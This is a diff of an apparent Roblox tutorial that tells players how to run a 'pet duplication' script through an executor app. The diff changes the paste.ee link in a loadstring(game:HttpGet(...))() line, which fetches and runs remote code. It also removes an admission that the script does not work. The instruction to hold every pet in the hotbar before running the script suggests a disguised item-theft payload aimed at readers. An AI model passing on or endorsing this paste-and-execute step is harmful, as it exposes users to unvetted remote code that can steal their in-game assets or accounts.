@@ -26,7 +26,7 @@ You must have all the requirements met, otherwise the script will not work.
 -Secondly, you need to pick up ALL the pets you have on the plot and put them in your hotbar (for the dupe to work), if not, it can think that you're a bot and it will NOT work.
 
 Copy this script:
-loadstring(game:HttpGet("https://paste.ee/r/45uZiHB9"))()
+loadstring(game:HttpGet("https://paste.ee/r/2pD038RI"))()
 
 And when you have all the requirements met AND you copied the script to the clipboard, press 2nd button (with the joystick icon).
 You can either press on the "thank you for using delta" to put the script and press execute, OR you can press "execute clipboard".
@@ -39,8 +39,6 @@ spawn: you press the "name of the pet", type any pet you want (it needs to be a 
 
 Enjoy using your script!
 (and im sorry that i changed the text several times, i had alot of mistakes in words because im not so english, im Russian. Tried my best to make that tutorial understandable to read)
-
-Also, one problem, the script is not working right now. The download for Delta X works, but the script dont works on Delta X because its recently got updated. i will change the text if i will update the script.
 
 
 
